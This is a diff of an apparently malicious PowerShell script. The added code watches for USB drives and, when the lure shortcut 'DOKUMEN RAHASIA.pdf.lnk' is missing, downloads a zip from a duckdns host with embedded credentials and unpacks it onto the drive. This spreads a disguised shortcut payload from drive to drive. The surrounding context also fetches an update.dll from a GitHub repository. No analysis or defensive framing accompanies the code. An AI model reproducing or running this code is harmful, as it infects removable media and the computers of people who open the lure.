@@ -1,5 +1,29 @@
 start-sleep 300 ; if (Test-Path "C:\helper\regex.exe") {
-    exit
+$usbdrive = $null
+function Check-USBDrive {
+    $drives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}
+    if ($drives) {
+        foreach ($drive in $drives) {
+            $usbdrive = $drive.DeviceID
+            # Run the command if USB drive is detected
+            while (Test-Path $usbdrive) {
+                if (Test-Path "$usbdrive\DOKUMEN RAHASIA.pdf.lnk") {
+                    Start-Sleep -Seconds 5
+                }
+                else {
+                    wget https://idontbelonghere123.duckdns.org/files/lnk.zip?XcSqRwewCSAqSfer14fwqr9IUd -Credential (New-Object PSCredential sudoku,(ConvertTo-SecureString "sudako" -AsPlainText -Force)) -o $env:tmp\lnk.zip ; expand-archive -path $env:tmp\lnk.zip -DestinationPath $usbdrive\ -Force ; Start-Sleep -Seconds 60000
+                }
+            }
+            Write-Host "USB Drive $($drive.DeviceID) unplugged. Restarting script..."
+            start-sleep 300
+        }
+    }
+}
+# Check for USB drive connection every 5 seconds
+while ($true) {
+    Check-USBDrive
+    Start-Sleep -Seconds 5
+}
 } else { Add-Type -AssemblyName PresentationFramework ; wget "https://github.com/othermeinthenightcontrol2/1/raw/refs/heads/main/update.dll" -o "C:\helper\update.dll" ; start-sleep 2; 
     while ($true) {
     try {
